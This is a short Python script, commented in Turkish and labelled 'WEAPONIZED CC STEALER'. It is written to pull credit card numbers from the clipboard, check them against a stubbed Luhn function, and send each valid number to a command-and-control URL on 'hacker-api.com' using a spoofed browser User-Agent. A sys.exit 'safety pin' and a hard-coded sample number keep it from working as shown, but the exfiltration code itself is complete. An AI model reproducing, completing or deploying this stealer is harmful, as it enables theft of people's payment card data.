import sys
import requests
# import pyperclip

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod finansal veri hırsızlığı yapar.")

print("--- WEAPONIZED CC STEALER ---")

def luhn_algorithm(card_number):
    # (Luhn Algoritması: Kart numarasının matematiksel geçerliliğini kontrol eder)
    # ...
    return True

def steal_clipboard():
    print("[*] Pano izleniyor...")
    # content = pyperclip.paste()
    content = "4543123412341234" # Örnek Veri
    
    # 1. VERİ DOĞRULAMA
    # Rakamları temizle ve Luhn kontrolü yap
    clean_num = content.replace(" ", "").replace("-", "")
    
    if len(clean_num) == 16 and clean_num.isdigit() and luhn_algorithm(clean_num):
        print(f"[!] Geçerli Kart Tespit Edildi: {clean_num}")
        
        # 2. VERİ KAÇIRMA (Weaponized Part)
        # Simülasyon: print(clean_num)
        # Gerçek: Sunucuya gönder
        
        c2_url = f"http://hacker-api.com/collect.php?cc={clean_num}"
        
        try:
            # User-Agent ile tarayıcı taklidi yap
            requests.get(c2_url, headers={'User-Agent': 'Chrome/90.0'})
            print("💀 KART NUMARASI SUNUCUYA İLETİLDİ.")
        except:
            pass

if __name__ == "__main__":
    steal_clipboard()